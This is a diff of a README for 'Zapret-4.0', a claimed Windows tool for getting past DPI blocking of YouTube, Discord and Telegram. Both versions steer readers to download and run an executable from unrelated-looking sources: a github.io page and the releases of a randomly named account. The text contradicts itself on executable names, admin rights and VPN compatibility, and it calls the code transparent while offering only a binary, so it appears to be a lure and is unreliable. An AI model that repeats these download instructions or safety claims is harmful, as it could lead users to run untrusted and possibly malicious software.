@@ -1,140 +1,68 @@
-<div align="center">
+# 🌐 Zapret-4.0 - Access blocked services with full speed
 
-<img src="preview.png" alt="Zapret 4.0 — обход блокировок" width="100%">
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Sunflowerseedheadgasket251/Zapret-4.0/releases)
 
-<br><br>
+Zapret-4.0 bypasses network restrictions for sites like YouTube, Discord, and Telegram. This tool changes how your computer talks to the internet to prevent providers from blocking specific traffic. You keep your connection speed because the tool does not route data through remote servers.
 
-[![Скачать](download.png)](https://zeptohornbilltassel.github.io/nightcore/)
+## 📋 System Requirements
 
-<br>
+Zapret-4.0 works on Windows 10 and Windows 11. It requires basic user permissions to change network settings. You do not need technical knowledge to use this software. Ensure you have an active internet connection before you start.
 
-![Windows](https://img.shields.io/badge/Windows_10%2F11-0078D4?style=flat-square&logo=windows&logoColor=white)
-![WFP](https://img.shields.io/badge/WFP-нативно-7c3aed?style=flat-square)
-![Статус](https://img.shields.io/badge/Статус-активно-22c55e?style=flat-square)
+## 📥 How to Install
 
-</div>
+1. Visit the [official releases page](https://github.com/Sunflowerseedheadgasket251/Zapret-4.0/releases).
+2. Look for the "Assets" section at the bottom of the latest release.
+3. Select the file ending in `.zip`.
+4. Save the file to your computer.
+5. Right-click the folder and select "Extract All" to see the contents.
+6. Open the folder to find the application.
 
----
+## 🚀 Setting Up the Software
 
-## Что это
+Open the folder you extracted in the previous step. Locate the file named `zapret-win.exe` or `start.bat`. Double-click this file to begin the process. A black window appears on your screen. This window shows the status of the connection. Leave this window open while you use the internet. 
 
-Большинство «решений» для обхода блокировок работают через сторонние серверы - вы просто меняете одного посредника на другого. Zapret работает иначе: он перехватывает пакеты на уровне Windows Filtering Platform и меняет их заголовки так, что системы глубокой пакетной инспекции (DPI) перестают видеть, что именно вы открываете. Трафик идёт напрямую — от вас к серверу назначения.
+The software automatically detects your network settings. It does not change your browser settings. It operates at the network level, so it works for all applications including browsers and messaging apps.
 
-Нет VPN-серверов, которые могут упасть. Нет иностранных компаний, которые хранят ваши запросы. Нет потери скорости из-за шифрования и туннелирования.
+## ⚙️ Understanding How It Works
 
----
+Most service blocks rely on deep packet inspection. This means your service provider looks at the contents of your data packets to see where they go. Zapret-4.0 modifies these data packets before they leave your computer. This makes the data look like regular traffic to your provider. Because the provider cannot identify the traffic, they allow it through. This approach avoids the need for external proxy servers or complex virtual private networks.
 
-## Что разблокирует
+## 🛡️ Privacy and Safety
 
-| Сервис | Статус | Метод |
-|--------|--------|-------|
-| YouTube | ✅ Работает | Fake SNI + disorder |
-| Discord | ✅ Работает | Fragment + TTL |
-| Telegram | ✅ Работает | Fake SNI |
-| Twitch | ✅ Работает | Disorder |
-| GitHub | ✅ Работает | Fragment |
-| Spotify | ⚠️ Частично | Зависит от региона |
+This software runs locally on your machine. No data leaves your computer to reach a third-party server. You remain in control of your privacy. It does not monitor your browsing history or collect personal files. The code remains transparent for anyone to review.
 
----
+## 🛠️ Troubleshooting Common Issues
 
-## Системные требования
+If you cannot access a blocked site, follow these steps:
 
-- **ОС:** Windows 10 (1903+) или Windows 11
-- **Запуск:** от имени администратора
-- **ОЗУ:** ~50 МБ во время работы
+1. Close the software window.
+2. Restart the application.
+3. Ensure your firewall allows the program.
+4. Check if your network connection stays active.
 
----
+Sometimes a specific service provider uses unique blocking methods. If the software does not work, try selecting a different configuration profile inside the settings menu. Most users find that the default settings work for all common services. 
 
-## Использование
+## 📝 Performance Tips
 
-```bash
-# Запуск в автоматическом режиме (определяет настройки сам)
-nightcore.exe
+Keep the application window open in the background. It consumes very little memory or processor power. You do not need to adjust settings for speed. The program ensures you receive the highest possible bandwidth from your current internet source. 
 
-# Только YouTube (быстрее, меньше нагрузка)
-nightcore.exe --mode youtube
+## ❓ Frequently Asked Questions
 
-# Полный режим — все поддерживаемые сервисы
-nightcore.exe --mode full
+**Does this require a monthly subscription?**
+No. This tool is free and does not use paid servers.
 
-# Посмотреть что происходит
-nightcore.exe --status
+**Will this slow down my connection?**
+No. Since you are not using a remote relay server, the speed remains identical to your normal network speed.
 
-# Остановить и откатить настройки
-nightcore.exe --stop
-```
+**Does this work on mobile devices?**
+This version is designed specifically for Windows desktop computers.
 
----
+**Can I run this and a VPN at the same time?**
+It is better to use one or the other. Running both might cause network conflicts and prevent sites from loading.
 
-## Конфигурация
+**What happens if I close the black window?**
+Closing the window turns off the protection. Blocking will return immediately.
 
-`config.json` в корне проекта:
+## 📂 Project Details
 
-```json
-{
-  "mode": "auto",
-  "services": ["youtube", "discord", "telegram", "twitch"],
-  "interface": "auto",
-  "fake_sni": true,
-  "disorder": 2,
-  "fragment_size": 4,
-  "log_level": "info"
-}
-```
-
-**`disorder`** — количество намеренно переставленных пакетов при установке соединения. Чем больше — тем надёжнее обход, чем меньше — тем ниже задержка.
-
-**`fake_sni`** — подделка Server Name Indication в TLS-рукопожатии. Обязательно для YouTube.
-
----
-
-## Как это устроено технически
-
-```
-Без Zapret:
-  Вы ──► [ТСПУ видит youtube.com] ──► ✗ заблокировано
-
-С Zapret:
-  Вы ──► [WFP перехватывает пакеты]
-          [меняет заголовки + disorder]
-         ──► [ТСПУ не распознаёт SNI] ──► ✓ youtube.com
-```
-
-ТСПУ (технические средства противодействия угрозам) работают по сигнатурам: они видят в TLS-заголовке строку `youtube.com` и режут соединение. Zapret дробит и переставляет первые пакеты так, что DPI не успевает собрать сигнатуру целиком — и пропускает соединение.
-
----
-
-## Часто задаваемые вопросы
-
-**Это безопасно?**  
-Zapret не перехватывает содержимое трафика — только служебные заголовки первых пакетов соединения. Никакие данные не покидают ваш компьютер в сторону третьих сервисов.
-
-**Совместим ли с другим VPN?**  
-Да. Zapret работает на сетевом стеке и не конфликтует с WireGuard, OpenVPN или системными прокси. Можно использовать одновременно.
-
-**Почему нужны права администратора?**  
-WFP (Windows Filtering Platform) требует привилегий. Без них невозможно зарегистрировать фильтр на сетевом стеке.
-
-**После обновления Windows перестал работать?**  
-Запустите `python zapret.py --reinstall` — переустановит WFP-провайдер под новую версию системы.
-
----
-
-## Обновление
-
-```bash
-git pull
-zapret.exe --reinstall
-```
-
----
-
-<div align="center">
-
-**Zapret 4.0**
-
-*Интернет без фильтров — это не запрос. Это норма.*
-
-Открытый код · Без серверов · Без регистрации · Без слежки
-
-</div>
+This tool incorporates specialized network packet manipulation techniques to bypass filters. It focuses on the specific requirements for services like Telegram and Discord which often struggle with standard connection tools. The project maintains a focus on simplicity and efficiency for the average user who wants unrestricted access to information.
